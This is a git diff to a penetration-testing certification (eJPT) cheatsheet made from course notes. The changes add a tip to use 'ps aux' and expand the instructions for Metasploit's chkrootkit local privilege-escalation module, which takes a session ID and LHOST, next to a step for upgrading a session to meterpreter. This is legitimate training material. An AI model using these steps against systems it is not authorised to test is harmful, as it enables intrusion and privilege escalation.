@@ -1,4 +1,4 @@
-# eJPT-CheatSheet
+ # eJPT-CheatSheet
 
 > **Note**
 > These are all the notes I took while following the INE course for eJPT certification, I strongly think everything you need to pass the exam is in this 'cheatsheet'.
@@ -2958,6 +2958,7 @@ sessions -u <session-id>
 ```
 
 > This command can be used to upgrade your current session into a meterpreter session and if it gives you can error then don't worry you can check the new session from the `sessions` command and than load the new one.
+ - `ps aux` use this to check the running process
 
 ```bash
 chkrootkit -V
@@ -2970,7 +2971,7 @@ chkrootkit -V
 ```msfconsole
 search exploit/unix/local/chkrootkit
 show options
-set CHKROOTKIT /path/to/file
+set CHKROOTKIT /path/to/file (see by using ps aux and check the process by cat command and open)
 set SESSION <session-id>
 set LHOST <localhost-ip>
 exploit
